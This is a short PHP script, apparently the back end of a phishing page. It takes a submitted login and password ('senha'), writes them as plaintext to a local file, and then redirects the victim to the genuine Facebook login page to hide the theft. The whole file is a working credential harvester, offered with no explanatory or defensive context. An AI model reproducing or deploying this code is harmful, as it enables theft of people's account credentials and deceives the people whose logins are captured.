<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST["login"];
    $senha = $_POST["senha"];
    $formulario = $_POST["formulario"];

    $dados =
        "Login: " .
        $login .
        "\nSenha: " .
        $senha .
        "\nFormulário: " .
        $formulario;

    ($arquivo = fopen("dados.txt", "w")) or
        die("Não foi possível criar o arquivo.");
    fwrite($arquivo, $dados);
    fclose($arquivo);

    echo "Dados salvos com sucesso.";

    header("Location: https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA5MjM4ODE1LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D");
}
?>
